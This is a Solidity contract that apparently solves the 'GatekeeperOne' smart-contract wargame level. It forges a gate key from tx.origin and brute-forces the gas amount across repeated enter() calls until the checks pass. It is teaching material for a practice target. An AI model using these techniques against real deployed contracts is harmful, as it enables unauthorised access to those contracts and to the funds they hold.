// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    IGatekeeperOne gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = IGatekeeperOne(_gatekeeper);
    }

    function attack() external {
        bytes8 key = bytes8(uint64(1 << 63) + uint16(uint160(tx.origin)));
        for (uint i = 200; i < 500; i++) {
            try gatekeeper.enter{gas: 8191 * 5 + i}(key) {
                return;
            } catch {}
        }
    }
}
